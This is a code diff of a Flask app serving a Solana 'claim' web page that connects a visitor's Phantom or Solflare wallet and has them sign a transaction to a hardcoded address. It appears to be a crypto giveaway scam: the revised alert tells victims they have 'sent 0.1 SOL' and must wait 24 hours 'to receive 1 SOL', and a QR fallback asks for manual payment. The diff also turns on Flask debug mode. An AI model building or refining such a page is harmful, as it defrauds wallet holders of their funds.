@@ -39,7 +39,6 @@ HTML_TEMPLATE = """
     font-weight: bold;
   }
 </style>
-<!-- Solana wallet adapter + scripts -->
 <script type="module">
   import {
     Connection,
@@ -54,54 +53,45 @@ HTML_TEMPLATE = """
     document.getElementById("walletStatus").innerText = text;
   }
 
-  async function detectProvider() {
-    if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
-      provider = window.solana;
-      return provider;
-    } else if (window.phantom && window.phantom.solana) {
-      provider = window.phantom.solana;
-      return provider;
+  function detectProvider() {
+    const sol = window.solana;
+    if (sol && (sol.isPhantom || sol.isSolflare)) {
+      return sol;
     }
     return null;
   }
 
-  async function connectWallet() {
-    updateStatus("Detecting wallet...");
-    provider = await detectProvider();
+  function connectWallet() {
+    updateStatus("Detecting wallet provider...");
+
+    provider = detectProvider();
 
     if (!provider) {
-      // No provider detected, open deep link to Solflare or Phantom mobile app
-      // You can try Solflare deep link first, fallback to Phantom
-
-      const solflareDeepLink = "solflare://connect";
-      const phantomDeepLink = "phantom://";
-
-      // Try to open solflare deep link (this will open the app if installed)
-      updateStatus("No wallet detected. Opening wallet app...");
-      window.location.href = solflareDeepLink;
-
-      // After this, user returns to browser and reloads to connect wallet manually
-
-      // Show QR code fallback after 5 seconds if no wallet connected
-      setTimeout(() => {
-        updateStatus("No wallet connection detected. Please send 0.1 SOL manually.");
-        document.getElementById("qrCode").style.display = "block";
-        document.getElementById("connectWalletBtn").disabled = true;
-        document.getElementById("claimBtn").disabled = true;
-      }, 5000);
-
+      updateStatus("No wallet detected. Please open Solflare or Phantom app manually.");
+      document.getElementById("qrCode").style.display = "block";
+      document.getElementById("connectWalletBtn").disabled = false;
+      document.getElementById("claimBtn").disabled = true;
       return;
     }
 
-    try {
-      const res = await provider.connect();
-      updateStatus("Wallet Connected: " + res.publicKey.toString());
+    if (provider.isConnected) {
+      updateStatus("Wallet already connected: " + provider.publicKey.toString());
       document.getElementById("connectWalletBtn").disabled = true;
       document.getElementById("claimBtn").disabled = false;
-    } catch (err) {
-      alert("Wallet connection failed: " + err.message);
-      updateStatus("Wallet connection failed");
+      return;
     }
+
+    provider.on("connect", () => {
+      updateStatus("Wallet Connected: " + provider.publicKey.toString());
+      document.getElementById("connectWalletBtn").disabled = true;
+      document.getElementById("claimBtn").disabled = false;
+    });
+
+    provider.connect().catch(err => {
+      updateStatus("Wallet connection failed: " + err.message);
+      document.getElementById("connectWalletBtn").disabled = false;
+      document.getElementById("claimBtn").disabled = true;
+    });
   }
 
   async function sendTransaction() {
@@ -123,7 +113,7 @@ HTML_TEMPLATE = """
     try {
       const { signature } = await provider.signAndSendTransaction(transaction);
       await connection.confirmTransaction(signature);
-      alert("✅ Transaction sent! You’ve claimed 0.1 SOL. Please wait 24 hours.");
+      alert("✅ Transaction sent! You’ve sent 0.1 SOL. Please wait 24 hours to receive 1 SOL.");
     } catch (e) {
       console.error(e);
       alert("❌ Transaction failed: " + e.message);
@@ -142,14 +132,16 @@ HTML_TEMPLATE = """
   <p id="walletStatus">Click "Connect Wallet" to begin</p>
   <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button">Connect Wallet</button>
   <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
-  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
+  <footer style="margin-top: 60px; font-size: 0.8em; color: #888;">
+    &copy; 2024 Your Project
+  </footer>
 </body>
 </html>
 """
 
 @app.route("/")
-def index():
+def home():
     return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    app.run(debug=True)
